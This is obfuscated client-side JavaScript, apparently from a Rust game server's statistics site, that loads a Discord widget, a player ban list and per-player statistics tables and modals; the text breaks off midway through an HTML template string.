const _0x31dfac = _0x130c;
(function(_0x36b2c6, _0x568808) {
    const _0x1de972 = _0x130c
      , _0x7d2124 = _0x36b2c6();
    while (!![]) {
        try {
            const _0x694a8a = parseInt(_0x1de972(0x235)) / 0x1 * (-parseInt(_0x1de972(0x143)) / 0x2) + -parseInt(_0x1de972(0x171)) / 0x3 * (parseInt(_0x1de972(0x2b9)) / 0x4) + -parseInt(_0x1de972(0xff)) / 0x5 + parseInt(_0x1de972(0x20e)) / 0x6 + parseInt(_0x1de972(0x124)) / 0x7 * (parseInt(_0x1de972(0xef)) / 0x8) + -parseInt(_0x1de972(0x12a)) / 0x9 + -parseInt(_0x1de972(0x1ae)) / 0xa * (-parseInt(_0x1de972(0x284)) / 0xb);
            if (_0x694a8a === _0x568808)
                break;
            else
                _0x7d2124['push'](_0x7d2124['shift']());
        } catch (_0x335878) {
            _0x7d2124['push'](_0x7d2124['shift']());
        }
    }
}(_0x20f0, 0xaba21));
let isAddingPlayerDiv = ![];
var guild_id = _0x31dfac(0x15d), invite_id = _0x31dfac(0x22e), retryInterval;
function DOMReady(_0x275a98) {
    const _0x43b2b7 = _0x31dfac;
    document[_0x43b2b7(0x194)] === 'loading' ? document['addEventListener']('DOMContentLoaded', function() {
        _0x275a98();
    }) : _0x275a98();
}
function getJSON(_0x146b42, _0x50b147) {
    const _0x307a7b = _0x31dfac;
    var _0x3e6f42 = 'onload'in new XMLHttpRequest() ? XMLHttpRequest : XDomainRequest
      , _0x5483c0 = new _0x3e6f42();
    _0x5483c0 != null && (_0x5483c0[_0x307a7b(0x2d2)](_0x307a7b(0x28f), _0x146b42, !![]),
    _0x5483c0[_0x307a7b(0x14e)](null)),
    _0x5483c0['onload'] = function() {
        const _0x4e078a = _0x307a7b;
        _0x50b147(_0x5483c0[_0x4e078a(0xf3)]);
    }
    ;
}
function UpdateDiscord(_0x2b5f87=![]) {
    const _0x3141d3 = _0x31dfac;
    getJSON('https://discord.com/api/v6/invites/' + invite_id + _0x3141d3(0x162), function(_0x90b381) {
        const _0x42b555 = _0x3141d3;
        try {
            _0x90b381 = JSON[_0x42b555(0x127)](_0x90b381);
        } catch (_0x4f60ea) {
            console[_0x42b555(0x23e)](_0x42b555(0x27d) + _0x4f60ea);
            return;
        }
        if (_0x90b381[_0x42b555(0x2a7)] != null)
            try {
                updateElements(_0x90b381, _0x2b5f87);
            } catch (_0x24e876) {
                console[_0x42b555(0x23e)]('Elements\x20not\x20found\x20' + _0x24e876),
                !_0x2b5f87 && retryUpdateDiscord();
            }
        else
            !_0x2b5f87 && (console[_0x42b555(0x23e)]('Discord\x20query\x20ok\x20but\x20invite\x20expired\x20for\x20guild\x20' + guild_id),
            getNewInvite());
    });
}
function updateElements(_0x3c74d4, _0x48ea8f) {
    const _0x3df532 = _0x31dfac;
    var _0x4944d6 = document[_0x3df532(0x2dc)](_0x3df532(0x20d))
      , _0x54a451 = document['getElementById'](_0x3df532(0x160))
      , _0x5089f1 = document[_0x3df532(0x2dc)]('discord-guild-all')
      , _0xddf306 = document['getElementById']('discord-guild-invite-btn');
    console[_0x3df532(0x23e)](_0x5089f1),
    _0x4944d6 && _0x54a451 && _0x5089f1 ? (_0x4944d6[_0x3df532(0x13c)] = _0x3c74d4['guild'][_0x3df532(0x2c6)],
    _0x54a451[_0x3df532(0x13c)] = _0x3c74d4['approximate_presence_count'] + _0x3df532(0x108),
    _0x5089f1[_0x3df532(0x13c)] = _0x3c74d4[_0x3df532(0x264)],
    _0x48ea8f && (_0xddf306['setAttribute'](_0x3df532(0x1a6), _0x3df532(0x104) + invite_id),
    iconElement[_0x3df532(0xf2)](_0x3df532(0x1a6), _0x3df532(0x104) + invite_id),
    stopRetry())) : (console[_0x3df532(0x23e)](_0x3df532(0x19f)),
    !_0x48ea8f && retryUpdateDiscord());
}
function _0x130c(_0xa08e30, _0x44666c) {
    const _0x20f0ef = _0x20f0();
    return _0x130c = function(_0x130c64, _0x5d1c52) {
        _0x130c64 = _0x130c64 - 0xee;
        let _0x106c0c = _0x20f0ef[_0x130c64];
        return _0x106c0c;
    }
    ,
    _0x130c(_0xa08e30, _0x44666c);
}
function retryUpdateDiscord() {
    const _0x17c5cd = _0x31dfac;
    console['log'](_0x17c5cd(0x279)),
    retryInterval = setInterval(function() {
        UpdateDiscord(!![]);
    }, 0xc350);
}
function stopRetry() {
    clearInterval(retryInterval);
}
function getNewInvite() {
    const _0x47ece9 = _0x31dfac;
    console[_0x47ece9(0x23e)](_0x47ece9(0x20c)),
    getJSON(_0x47ece9(0x158) + guild_id + '/widget.json', function(_0x41d28e) {
        const _0x55d3ed = _0x47ece9;
        try {
            _0x41d28e = JSON['parse'](_0x41d28e);
        } catch (_0x30af12) {
            console[_0x55d3ed(0x23e)](_0x55d3ed(0x2da) + _0x30af12);
            return;
        }
        _0x41d28e['instant_invite'] != null ? (invite_id = _0x41d28e[_0x55d3ed(0x116)][_0x55d3ed(0x156)](/invite\/(\w+)$/)[0x1],
        console[_0x55d3ed(0x23e)](_0x55d3ed(0x137) + invite_id),
        UpdateDiscord(!![])) : stopRetry();
    });
}
DOMReady(function() {
    const _0xea35d2 = _0x31dfac;
    try {
        UpdateDiscord();
    } catch (_0x99788f) {
        console[_0xea35d2(0x23e)](_0xea35d2(0x15f) + _0x99788f);
    }
});
function OnCustomWidgetSet(_0x3ae6ab) {
    const _0x4bdf86 = _0x31dfac;
    console['log'](_0x4bdf86(0xee) + _0x3ae6ab),
    _0x3ae6ab == 0x20056 ? UpdateDiscord() : stopRetry();
}
let isDisplayDataCalled = ![], banlistTable, isLoadingBanlist = ![];
async function loadScript(_0x43f8a7) {
    return new Promise( (_0x242ffa, _0x1f7af3) => {
        const _0x4dc52f = _0x130c
          , _0x5a2925 = document['createElement'](_0x4dc52f(0x238));
        _0x5a2925[_0x4dc52f(0x21e)] = _0x43f8a7,
        _0x5a2925['onload'] = () => {
            _0x242ffa();
        }
        ,
        _0x5a2925[_0x4dc52f(0x198)] = _0x1f7af3,
        document['head'][_0x4dc52f(0x219)](_0x5a2925);
    }
    );
}
async function loadDependencies() {
    const _0x2487cb = _0x31dfac;
    try {
        await loadScript('https://code.jquery.com/jquery-3.5.1.js'),
        await loadScript(_0x2487cb(0x29e)),
        await loadScript(_0x2487cb(0x252)),
        await loadScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.js');
    } catch (_0x2b63ec) {
        console['error'](_0x2487cb(0x15c), _0x2b63ec);
    }
}
async function fetchData(_0x4ab948) {
    const _0x2cdf3f = _0x31dfac;
    try {
        isLoadingTop = !![];
        const _0xa3a912 = document[_0x2cdf3f(0x2dc)](_0x2cdf3f(0x218));
        _0xa3a912[_0x2cdf3f(0x1a1)][_0x2cdf3f(0x1b1)] = 'block';
        const _0x10da5d = await fetch(_0x2cdf3f(0x175) + _0x4ab948);
        if (!_0x10da5d['ok'])
            return console[_0x2cdf3f(0x18c)]('Ошибка\x20при\x20запросе\x20данных:', _0x10da5d[_0x2cdf3f(0x109)], _0x10da5d[_0x2cdf3f(0x13d)]),
            null;
        const _0x1cc1a2 = await _0x10da5d[_0x2cdf3f(0x129)]();
        return _0x1cc1a2;
    } catch (_0x256281) {
        return console[_0x2cdf3f(0x18c)](_0x2cdf3f(0x130), _0x256281),
        null;
    } finally {
        isLoadingTop = ![];
    }
}
async function displayData(_0x5694ed) {
    const _0x88a9bf = _0x31dfac;
    if (isDisplayDataCalled)
        return;
    isDisplayDataCalled = !![];
    const _0x515615 = document[_0x88a9bf(0x2dc)]('loading')
      , _0x52d71b = document[_0x88a9bf(0x2dc)](_0x88a9bf(0x185))
      , _0x4d356d = document[_0x88a9bf(0x2dc)](_0x88a9bf(0x1e7))
      , _0x5eb355 = document[_0x88a9bf(0x2dc)]('loading-indicator')
      , _0x38b952 = await fetchData(_0x5694ed);
    banlistTable && banlistTable[_0x88a9bf(0x221)]();
    if (!_0x38b952) {
        _0x515615[_0x88a9bf(0x1aa)] = _0x88a9bf(0x10b),
        console[_0x88a9bf(0x23e)](_0x88a9bf(0x10b));
        return;
    }
    const _0x52c31a = Object[_0x88a9bf(0x17d)](_0x38b952)[0x0];
    _0x52d71b[_0x88a9bf(0x1b2)] = 'Personaname:\x20' + _0x52c31a[_0x88a9bf(0x2b0)],
    banlistTable = $(_0x88a9bf(0x177))['DataTable']({
        'language': {
            'url': _0x88a9bf(0x252)
        },
        'dom': _0x88a9bf(0x274),
        'buttons': [_0x88a9bf(0x261), 'excel', _0x88a9bf(0x157)],
        'paging': !![],
        'ordering': ![],
        'searching': !![],
        'stateSave': !![],
        'autoWidth': ![],
        'pageLength': 0x28,
        'data': Object[_0x88a9bf(0x1f5)](_0x38b952)[_0x88a9bf(0x27c)]( ([_0x1a44c7,_0x2c2c62]) => ({
            'Personaname': _0x2c2c62[_0x88a9bf(0x2b0)],
            'SteamID': _0x1a44c7,
            'BanDate': _0x2c2c62['BanDate'],
            'ExpireDate': _0x2c2c62[_0x88a9bf(0x16d)],
            'Reason': _0x2c2c62['Reason'][_0x88a9bf(0x167)](/"/g, ''),
            'WhoBanned': _0x2c2c62['who_banned'],
            'Id': _0x2c2c62['Id']
        })),
        'columns': [{
            'data': _0x88a9bf(0x2b0),
            'render': function(_0xf3d5c5, _0x358e91, _0x1f0b22) {
                const _0x250455 = _0x88a9bf;
                return _0x358e91 === _0x250455(0x1b1) ? '<div>' + _0xf3d5c5 + _0x250455(0x262) + _0x1f0b22[_0x250455(0x2bd)] + _0x250455(0x14b) : _0xf3d5c5;
            }
        }, {
            'data': _0x88a9bf(0x16c)
        }, {
            'data': 'ExpireDate'
        }, {
            'data': _0x88a9bf(0x1da),
            'render': function(_0x30730e, _0x17e8cc, _0x1b538e) {
                const _0x459a63 = _0x88a9bf;
                return _0x17e8cc === _0x459a63(0x1b1) ? _0x30730e : _0x30730e;
            }
        }, {
            'data': 'WhoBanned',
            'render': function(_0x3f4f10, _0x36d1ae, _0x2adcda) {
                const _0x10a538 = _0x88a9bf;
                return _0x36d1ae === _0x10a538(0x1b1) ? _0x10a538(0x27b) + _0x3f4f10 + _0x10a538(0x132) : _0x3f4f10;
            }
        }, {
            'data': 'Id',
            'visible': ![]
        }, {
            'data': _0x88a9bf(0x2bd),
            'searchable': !![],
            'visible': ![]
        }]
    }),
    $('#russian_banlist\x20tbody')['on'](_0x88a9bf(0x201), 'td:nth-child(1)', function() {
        const _0x555e3d = _0x88a9bf
          , _0x3979e2 = $(this)['find'](_0x555e3d(0x2be))[_0x555e3d(0x20a)]();
        _0x3979e2 && window[_0x555e3d(0x2d2)]('https://steamcommunity.com/profiles/' + _0x3979e2, _0x555e3d(0x2b1));
    }),
    _0x5eb355[_0x88a9bf(0x1a1)][_0x88a9bf(0x1b1)] = _0x88a9bf(0x18d),
    _0x515615[_0x88a9bf(0x1a1)][_0x88a9bf(0x1b1)] = _0x88a9bf(0x18d),
    _0x4d356d[_0x88a9bf(0x1a1)]['display'] = _0x88a9bf(0x1fb),
    isLoadingTop = ![];
}
let isBtnBanClicked = ![];
function findAndAttachEvent() {
    const _0x28cdc6 = _0x31dfac
      , _0x32df81 = document[_0x28cdc6(0x1fd)](_0x28cdc6(0x2c3));
    _0x32df81[_0x28cdc6(0x26d)] > 0x0 && (setTimeout(function() {
        const _0x362617 = _0x28cdc6
          , _0x5a3ed0 = document['getElementById'](_0x362617(0x2ba));
        _0x5a3ed0 && !isBtnBanClicked && (isBtnBanClicked = !![],
        _0x5a3ed0['click']());
    }, 0x12c),
    clearInterval(searchInterval),
    _0x32df81[_0x28cdc6(0x1bf)](_0x593097 => {
        const _0x2fff9e = _0x28cdc6;
        _0x593097['addEventListener'](_0x2fff9e(0x201), async () => {
            const _0x2acdcb = _0x2fff9e;
            _0x593097[_0x2acdcb(0x1a4)] = !![];
            try {
                _0x32df81['forEach'](_0x12f243 => {
                    const _0x3a30da = _0x2acdcb;
                    _0x12f243[_0x3a30da(0x174)]['remove'](_0x3a30da(0x268));
                }
                ),
                _0x593097[_0x2acdcb(0x174)][_0x2acdcb(0xf5)](_0x2acdcb(0x268)),
                await displayData(_0x593097[_0x2acdcb(0xfa)]['table']);
            } catch (_0x557284) {
                console[_0x2acdcb(0x18c)](_0x2acdcb(0x27a), _0x557284);
            } finally {
                _0x593097[_0x2acdcb(0x1a4)] = ![];
            }
            isDisplayDataCalled = ![];
        }
        );
    }
    ));
}
let isStatsDataDisplayed = ![], statsTable, isLoading = ![];
async function fetchStats(_0x4a09cb, _0x7977f5) {
    const _0x2a95f5 = _0x31dfac;
    try {
        isLoading = !![];
        const _0x3b950a = document[_0x2a95f5(0x2dc)]('loading-indicator');
        _0x3b950a[_0x2a95f5(0x1a1)][_0x2a95f5(0x1b1)] = _0x2a95f5(0x1fb);
        const _0x4da635 = await fetch(_0x2a95f5(0x1d3) + _0x4a09cb + '&timeframe=' + _0x7977f5);
        if (!_0x4da635['ok'])
            return console['error']('Ошибка\x20при\x20запросе\x20данных:', _0x4da635[_0x2a95f5(0x109)], _0x4da635[_0x2a95f5(0x13d)]),
            null;
        const _0x14c012 = await _0x4da635[_0x2a95f5(0x129)]();
        return _0x14c012;
    } catch (_0x5d38a7) {
        return console[_0x2a95f5(0x18c)](_0x2a95f5(0x130), _0x5d38a7),
        null;
    } finally {
        isLoading = ![];
    }
}
async function displayDataStats(_0x3bab92, _0x5ed8cb) {
    const _0xa2cad1 = _0x31dfac;
    if (isStatsDataDisplayed)
        return;
    isStatsDataDisplayed = !![];
    const _0xc8b5f9 = document[_0xa2cad1(0x2dc)](_0xa2cad1(0x18e))
      , _0x3c6754 = document['getElementById'](_0xa2cad1(0x1e7))
      , _0x2b434c = document[_0xa2cad1(0x2dc)](_0xa2cad1(0x218));
    try {
        const _0x115574 = await fetchStats(_0x3bab92, _0x5ed8cb);
        statsTable && statsTable[_0xa2cad1(0x17a)]()[_0xa2cad1(0x221)]();
        if (!_0x115574 || Object['keys'](_0x115574)[_0xa2cad1(0x26d)] === 0x0) {
            _0xc8b5f9['innerHTML'] = 'Нет\x20данных\x20для\x20отображения';
            return;
        }
        $['fn'][_0xa2cad1(0x125)][_0xa2cad1(0x229)][_0xa2cad1(0x10d)]['order']['playtime-pre'] = function(_0x57a94f) {
            const _0x53c8a6 = _0xa2cad1;
            let _0x5db57e = 0x0;
            return _0x57a94f[_0x53c8a6(0x156)](/(\d+)([дчм])/g)[_0x53c8a6(0x1bf)](function(_0x3bb2c8) {
                const _0xc294c9 = _0x53c8a6
                  , _0x2ef15f = parseInt(_0x3bb2c8, 0xa)
                  , _0x5bc11f = _0x3bb2c8[_0xc294c9(0x156)](/[дчм]/)[0x0]
                  , _0x332742 = {
                    'д': 0x18 * 0x3c,
                    'ч': 0x3c,
                    'м': 0x1
                }[_0x5bc11f];
                _0x5db57e += _0x2ef15f * _0x332742;
            }),
            _0x5db57e;
        }
        ,
        statsTable = $('#statistics')[_0xa2cad1(0x11b)]({
            'language': {
                'url': 'https://cdn.datatables.net/plug-ins/1.10.24/i18n/Russian.json'
            },
            'dom': _0xa2cad1(0x274),
            'buttons': [_0xa2cad1(0x261), 'excel', 'pdf'],
            'paging': !![],
            'ordering': !![],
            'searching': !![],
            'stateSave': !![],
            'autoWidth': ![],
            'pageLength': 0x28,
            'data': Object[_0xa2cad1(0x17d)](_0x115574),
            'columns': [{
                'data': null,
                'render': function(_0x467efa, _0x312c41, _0x1169c7) {
                    const _0x5077c7 = _0xa2cad1;
                    return _0x5077c7(0x1b6) + _0x1169c7[_0x5077c7(0x240)] + _0x5077c7(0x262) + _0x1169c7[_0x5077c7(0x2bd)] + _0x5077c7(0x14b);
                }
            }, {
                'data': _0xa2cad1(0x21d),
                'type': _0xa2cad1(0x2cf)
            }, {
                'data': _0xa2cad1(0x100)
            }, {
                'data': _0xa2cad1(0x287)
            }, {
                'data': null,
                'render': function(_0x57eacc, _0x3d6e24, _0x4f5ef1) {
                    const _0xee4b8b = _0xa2cad1;
                    let _0x3547a2 = _0x4f5ef1[_0xee4b8b(0x100)]
                      , _0x4bd6ae = _0x4f5ef1[_0xee4b8b(0x287)]
                      , _0x27d6f1 = _0x4bd6ae > 0x0 ? (_0x3547a2 / _0x4bd6ae)[_0xee4b8b(0x25e)](0x2) : _0x3547a2;
                    return _0x27d6f1;
                },
                'title': _0xa2cad1(0x1b5)
            }, {
                'data': 'Score'
            }, {
                'data': null,
                'render': function(_0x28da2d, _0x2a1996, _0x15e8af) {
                    const _0x1b98ff = _0xa2cad1;
                    return _0x1b98ff(0x259) + _0x15e8af[_0x1b98ff(0x20f)] + '\x22>\x20' + _0x15e8af[_0x1b98ff(0x20f)] + _0x1b98ff(0x132);
                }
            }, {
                'data': null,
                'render': function(_0x4ad0b4, _0x10ab63, _0x467ff4) {
                    const _0x2a55c8 = _0xa2cad1;
                    return _0x2a55c8(0x142) + _0x467ff4['SteamID'] + _0x2a55c8(0x1bc) + _0x3bab92 + _0x2a55c8(0x213) + _0x5ed8cb + '\x22>Подробнее</button>';
                }
            }],
            'order': [[0x2, 'desc']]
        }),
        $(_0xa2cad1(0x2aa))['on'](_0xa2cad1(0x201), _0xa2cad1(0x230), function() {
            const _0x326545 = _0xa2cad1
              , _0x58e836 = $(this)['find'](_0x326545(0x2be))[_0x326545(0x20a)]();
            _0x58e836 && window['open'](_0x326545(0x1f4) + _0x58e836, _0x326545(0x2b1));
        });
    } catch (_0x1ed29e) {
        console[_0xa2cad1(0x18c)](_0xa2cad1(0x27a), _0x1ed29e);
    } finally {
        _0x2b434c['style'][_0xa2cad1(0x1b1)] = _0xa2cad1(0x18d),
        _0xc8b5f9[_0xa2cad1(0x1a1)]['display'] = _0xa2cad1(0x18d),
        _0x3c6754['style']['display'] = _0xa2cad1(0x1fb),
        isStatsDataDisplayed = ![];
        const _0x376230 = document[_0xa2cad1(0x1d5)](_0xa2cad1(0x187));
        _0x376230[_0xa2cad1(0x1a1)][_0xa2cad1(0x102)] = _0xa2cad1(0x18a);
    }
}
let modalOpen = ![]
  , isBtnStatsClicked = ![];
function findAndAttachEventStats() {
    const _0x1db7bc = _0x31dfac
      , _0x5effb6 = document[_0x1db7bc(0x1fd)](_0x1db7bc(0x273))
      , _0x1da7db = document['querySelectorAll']('input[name=\x22timeframe\x22]');
    _0x5effb6[_0x1db7bc(0x26d)] > 0x0 && (clearInterval(searchIntervalstats),
    setTimeout(function() {
        const _0xfc4677 = _0x1db7bc
          , _0x2f0691 = document[_0xfc4677(0x2dc)](_0xfc4677(0x182));
        _0x2f0691 && !isBtnStatsClicked && (isBtnStatsClicked = !![],
        _0x2f0691[_0xfc4677(0x201)]());
    }, 0x12c),
    _0x5effb6[_0x1db7bc(0x1bf)](_0x42b336 => {
        const _0x29d538 = _0x1db7bc;
        _0x42b336[_0x29d538(0x2ac)](_0x29d538(0x201), async () => {
            const _0x57b2f1 = _0x29d538;
            _0x42b336[_0x57b2f1(0x1a4)] = !![];
            try {
                _0x5effb6[_0x57b2f1(0x1bf)](_0x4d5a71 => {
                    const _0x43e45f = _0x57b2f1;
                    _0x4d5a71[_0x43e45f(0x174)]['remove']('active');
                }
                ),
                _0x42b336[_0x57b2f1(0x174)][_0x57b2f1(0xf5)](_0x57b2f1(0x268));
                const _0x53d778 = document[_0x57b2f1(0x2dc)](_0x57b2f1(0x1e7));
                _0x53d778[_0x57b2f1(0x1a1)][_0x57b2f1(0x1b1)] = _0x57b2f1(0x18d);
                const _0x5d440c = Array['from'](_0x1da7db)[_0x57b2f1(0x17c)](_0x509131 => _0x509131[_0x57b2f1(0x1ba)])[_0x57b2f1(0x1d6)];
                await displayDataStats(_0x42b336[_0x57b2f1(0xfa)][_0x57b2f1(0x1ed)], _0x5d440c);
            } catch (_0x26abd8) {
                console[_0x57b2f1(0x18c)](_0x57b2f1(0x27a), _0x26abd8);
            } finally {
                _0x42b336[_0x57b2f1(0x1a4)] = ![],
                attachDetailsButtonClickEvent();
            }
        }
        );
    }
    ),
    _0x1da7db[_0x1db7bc(0x1bf)](_0x3fd053 => {
        const _0x4cea8f = _0x1db7bc;
        _0x3fd053[_0x4cea8f(0x2ac)](_0x4cea8f(0x29f), async () => {
            const _0x18e927 = _0x4cea8f
              , _0x344e40 = document[_0x18e927(0x2dc)](_0x18e927(0x1e7));
            _0x344e40['style'][_0x18e927(0x1b1)] = 'none';
            const _0x374279 = document[_0x18e927(0x1d5)](_0x18e927(0x1d8));
            if (_0x374279) {
                const _0xc1a5eb = Array[_0x18e927(0x2a4)](_0x1da7db)[_0x18e927(0x17c)](_0x332dd4 => _0x332dd4[_0x18e927(0x1ba)])[_0x18e927(0x1d6)];
                await displayDataStats(_0x374279[_0x18e927(0xfa)][_0x18e927(0x1ed)], _0xc1a5eb);
            }
        }
        );
    }
    ),
    attachDetailsButtonClickEvent());
}
function attachDetailsButtonClickEvent() {
    const _0x2d01c5 = _0x31dfac;
    document['body'][_0x2d01c5(0x2ac)](_0x2d01c5(0x201), async _0xfbabcc => {
        const _0x2c8519 = _0x2d01c5
          , _0x2a997a = _0xfbabcc['target'];
        if (_0x2a997a[_0x2c8519(0x174)][_0x2c8519(0x1f8)](_0x2c8519(0x1df)) && !modalOpen) {
            _0xfbabcc[_0x2c8519(0x233)](),
            modalOpen = !![],
            document[_0x2c8519(0x21b)][_0x2c8519(0x174)][_0x2c8519(0xf5)](_0x2c8519(0xf9)),
            console[_0x2c8519(0x23e)](_0x2c8519(0x24b));
            const _0x3f9535 = _0x2a997a[_0x2c8519(0xfa)][_0x2c8519(0x20b)]
              , _0x2556e9 = _0x2a997a[_0x2c8519(0xfa)][_0x2c8519(0x1ed)]
              , _0x5d713d = _0x2a997a[_0x2c8519(0xfa)][_0x2c8519(0x2b7)]
              , _0x3655b2 = _0x2c8519(0x2d1) + _0x3f9535 + _0x2c8519(0x2d5) + _0x2556e9 + '&timeframe=' + _0x5d713d;
            try {
                const _0x45f373 = await fetch(_0x3655b2);
                if (!_0x45f373['ok']) {
                    console['error'](_0x2c8519(0x231), _0x45f373[_0x2c8519(0x109)], _0x45f373[_0x2c8519(0x13d)]),
                    document[_0x2c8519(0x21b)][_0x2c8519(0x174)][_0x2c8519(0x244)]('body-no-scroll'),
                    modalOpen = ![],
                    document['body']['classList'][_0x2c8519(0x244)](_0x2c8519(0xf9));
                    return;
                }
                const _0x5bb8b3 = await _0x45f373[_0x2c8519(0x129)]();
                createModal(_0x5bb8b3);
            } catch (_0xc3761c) {
                console[_0x2c8519(0x18c)](_0x2c8519(0x130), _0xc3761c),
                document['body'][_0x2c8519(0x174)]['remove'](_0x2c8519(0xf9)),
                modalOpen = ![],
                document[_0x2c8519(0x21b)]['classList']['remove'](_0x2c8519(0xf9));
            }
        }
    }
    );
}
function createModal(_0x3f5ffc) {
    const _0x4407e6 = _0x31dfac
      , _0x5d226e = document['createElement'](_0x4407e6(0x1ef));
    _0x5d226e['classList'][_0x4407e6(0xf5)](_0x4407e6(0x186));
    const _0x495b58 = document['createElement'](_0x4407e6(0x1ef));
    _0x495b58[_0x4407e6(0x174)][_0x4407e6(0xf5)]('modal-content');
    const _0x5af60c = document['createElement'](_0x4407e6(0x112));
    _0x5af60c[_0x4407e6(0x174)][_0x4407e6(0xf5)](_0x4407e6(0x10f)),
    _0x5af60c['innerHTML'] = _0x4407e6(0x271);
    const _0x18b79c = document['createElement']('div');
    _0x18b79c['id'] = _0x4407e6(0x19d),
    _0x18b79c[_0x4407e6(0x1aa)] = formatStatsData(_0x3f5ffc),
    _0x495b58['appendChild'](_0x5af60c),
    _0x495b58['appendChild'](_0x18b79c),
    _0x5d226e[_0x4407e6(0x219)](_0x495b58),
    document[_0x4407e6(0x21b)]['appendChild'](_0x5d226e),
    _0x5d226e['style'][_0x4407e6(0x1b1)] = _0x4407e6(0x1dd),
    _0x5af60c[_0x4407e6(0x2ac)](_0x4407e6(0x201), () => {
        const _0x24c58e = _0x4407e6;
        _0x5d226e[_0x24c58e(0x1a1)]['display'] = _0x24c58e(0x18d),
        document[_0x24c58e(0x21b)][_0x24c58e(0x1c4)](_0x5d226e),
        modalOpen = ![],
        document[_0x24c58e(0x21b)][_0x24c58e(0x174)][_0x24c58e(0x244)]('body-no-scroll');
    }
    ),
    window[_0x4407e6(0x2ac)]('click', _0x11ec6b => {
        const _0x5c0ac6 = _0x4407e6;
        _0x11ec6b[_0x5c0ac6(0x144)] === _0x5d226e && (_0x5d226e[_0x5c0ac6(0x1a1)]['display'] = _0x5c0ac6(0x18d),
        document[_0x5c0ac6(0x21b)][_0x5c0ac6(0x1c4)](_0x5d226e),
        modalOpen = ![],
        document[_0x5c0ac6(0x21b)][_0x5c0ac6(0x174)][_0x5c0ac6(0x244)](_0x5c0ac6(0xf9)));
    }
    );
}
function formatTime(_0x39d624) {
    const _0x19797e = _0x31dfac
      , _0x2106c7 = Math[_0x19797e(0x247)](_0x39d624 / 0x5a0)
      , _0x58e923 = Math[_0x19797e(0x247)]((_0x39d624 - _0x2106c7 * 0x5a0) / 0x3c)
      , _0x15dbbd = _0x39d624 - _0x2106c7 * 0x5a0 - _0x58e923 * 0x3c
      , _0x3ae9ff = _0x2106c7 + 'd:' + _0x58e923 + 'h:' + _0x15dbbd + 'm';
    return _0x3ae9ff;
}
function formatStatsData(_0x285a90) {
    const _0x314e71 = _0x31dfac
      , _0x3b2bf9 = _0x285a90[Object[_0x314e71(0x184)](_0x285a90)[0x0]] || {};
    let _0x1a29e7 = _0x314e71(0x1c1) + _0x3b2bf9[_0x314e71(0x2bd)] + _0x314e71(0x1cb) + (_0x3b2bf9['Name'] || 0x0) + _0x314e71(0x193) + (_0x3b2bf9[_0x314e71(0x14f)]?.['DayNumber'] || 0x0) + _0x314e71(0x2db) + (_0x3b2bf9['Connected'] || offline) + '\x22>' + (_0x3b2bf9['Connected'] || 0x0) + '</span></p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22stats-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__item-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22http://getdrawings.com/free-icon-bw/exp-icon-15.png\x22\x20class=\x22points\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__title\x22>Всего\x20очков</div><span\x20class=\x22user-stat__value\x22>' + (_0x3b2bf9['Score'] || 0x0) + _0x314e71(0x246) + (_0x3b2bf9[_0x314e71(0x14f)]?.['PlayedToday'] || 0x0) + _0x314e71(0x1d0) + (_0x3b2bf9[_0x314e71(0x14f)]?.[_0x314e71(0x128)] || 0x0) + _0x314e71(0x2b8) + (_0x3b2bf9[_0x314e71(0x196)]?.['boars'] || 0x0) + _0x314e71(0x1ce) + (_0x3b2bf9[_0x314e71(0x196)]?.['deers'] || 0x0) + _0x314e71(0xf6) + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x28a)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Лошадей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/horse.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<